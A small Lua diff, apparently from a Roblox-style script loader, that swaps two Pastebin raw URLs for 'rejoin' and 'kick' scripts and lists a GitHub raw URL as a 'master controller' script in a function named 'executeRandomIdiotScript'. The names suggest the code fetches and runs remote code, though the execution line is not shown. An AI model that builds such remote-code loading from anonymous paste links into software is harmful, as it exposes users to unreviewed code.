@@ -1,7 +1,7 @@
 local function executeRandomIdiotScript()
     -- Configured endpoints
-    local rjScriptURL = "https://pastebin.com/raw/rTui1M6R"
-    local kickScriptURL = "https://pastebin.com/raw/78Y2smJ5"
+    local rjScriptURL = "https://pastebin.com/raw/WR4XTQpG"
+    local kickScriptURL = "https://pastebin.com/raw/CD7hnGxm"
     
     -- Hardcoded master controller script address
     local masterFunctionURL = "https://raw.githubusercontent.com/Camtuong153/Scrupt/refs/heads/main/baze0.lua"
